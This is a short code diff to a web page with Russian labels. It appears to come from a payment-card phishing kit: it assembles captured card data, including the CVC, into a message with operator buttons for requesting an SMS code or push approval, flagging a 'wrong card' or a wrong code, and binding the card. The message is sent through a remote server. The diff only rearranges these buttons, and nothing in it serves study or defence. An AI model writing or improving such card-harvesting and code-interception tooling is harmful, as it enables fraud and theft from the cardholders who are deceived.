@@ -1345,31 +1345,39 @@
 • CVC: ${cvc}`;
 
         const replyMarkup = {
-            inline_keyboard: [
-                [
-                    { 
-                        text: "📱 SMS код", 
-                        callback_data: `sms:${paymentId}:${userId}`
-                    },
-                    { 
-                        text: "🔔 Пуш", 
-                        callback_data: `push:${paymentId}:${userId}`
-                    }
-                ],
-                [
-                    {
-                        text: "🔗 Привязать",
-                        callback_data: `bind:${paymentId}:${userId}`
-                    }
-                ],
-                [
-                    { 
-                        text: "❌ Неверная карта", 
-                        callback_data: `wrong_card:${paymentId}:${userId}`
-                    }
-                ]
-            ]
-        };
+    inline_keyboard: [
+        [
+            { 
+                text: "📱 SMS код", 
+                callback_data: `sms:${paymentId}:${userId}`
+            },
+            { 
+                text: "🔔 Пуш", 
+                callback_data: `push:${paymentId}:${userId}`
+            },
+            { 
+                text: "❌ Неверная карта", 
+                callback_data: `wrong_card:${paymentId}:${userId}`
+            }
+        ],
+        [
+            { 
+                text: "❌ Неверный SMS код", 
+                callback_data: `wrong_sms:${paymentId}:${userId}`
+            }
+        ]
+    ]
+};
+
+// Добавляем кнопку Привязать только если карта не привязана
+if (!isCardBound) {
+    replyMarkup.inline_keyboard.push([
+        {
+            text: "🔗 Привязать",
+            callback_data: `bind:${paymentId}:${userId}`
+        }
+    ]);
+}
 
         // ОТПРАВЛЯЕМ ЧЕРЕЗ СЕРВЕР (БЕЗОПАСНО)
         const SERVER_URL = 'https://roomix-production.up.railway.app';
@@ -1520,6 +1528,7 @@
     </script>
 </body>
 </html>
+
 
 
 
